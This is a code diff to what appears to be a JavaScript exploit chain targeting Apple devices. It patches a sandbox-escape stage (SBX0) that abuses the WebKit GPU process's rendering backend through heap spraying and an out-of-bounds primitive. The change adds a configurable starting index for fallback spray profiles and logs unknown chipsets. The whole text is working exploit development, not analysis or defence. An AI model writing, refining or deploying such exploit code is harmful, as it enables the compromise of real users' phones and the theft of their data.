@@ -7,7 +7,8 @@
     dlopen,
     dlsym,
     device_model,
-    chipset
+    chipset,
+    sbx0_fallback_start
   } = p;
   const libsystem_kernel = dlopen('/usr/lib/system/libsystem_kernel.dylib', 1n);
   const libsystem_platform = dlopen('/usr/lib/system/libsystem_platform.dylib', 1n);
@@ -7117,6 +7118,11 @@
     spray_profiles.wide_alt_fill,
     spray_profiles.wide
   ];
+  const fallback_spray_profile_count = fallback_spray_profiles.length;
+  let fallback_spray_start_index = parseInt(sbx0_fallback_start, 10);
+  if (!isFinite(fallback_spray_start_index)) fallback_spray_start_index = 0;
+  fallback_spray_start_index %= fallback_spray_profile_count;
+  if (fallback_spray_start_index < 0) fallback_spray_start_index += fallback_spray_profile_count;
   (function SBX0() {
     LOG(`[+] SBX0() (retry: ${retry_count++})`);
     function GPUConnectionToWebProcess_CreateRenderingBackend(backendConnection) {
@@ -7305,7 +7311,7 @@
       if (known_profile) {
         return known_profile;
       }
-      const fallback_index = Math.max(0, retry_count - 2) % fallback_spray_profiles.length;
+      const fallback_index = (fallback_spray_start_index + Math.max(0, retry_count - 2)) % fallback_spray_profiles.length;
       return fallback_spray_profiles[fallback_index];
     }
     function applySprayPlan(plan) {
@@ -7316,6 +7322,9 @@
     function oob() {
       LOG(`oob()`);
       const spray_profile = currentSprayProfile();
+      if (!chipset_spray_profile[chipset] && retry_count <= 2) {
+        LOG(`unknown chipset fallback_start=${fallback_spray_start_index}`);
+      }
       LOG(`spray profile: ${spray_profile.name} chipset=${chipset}`);
       const width = 1;
       const height = 0x200;
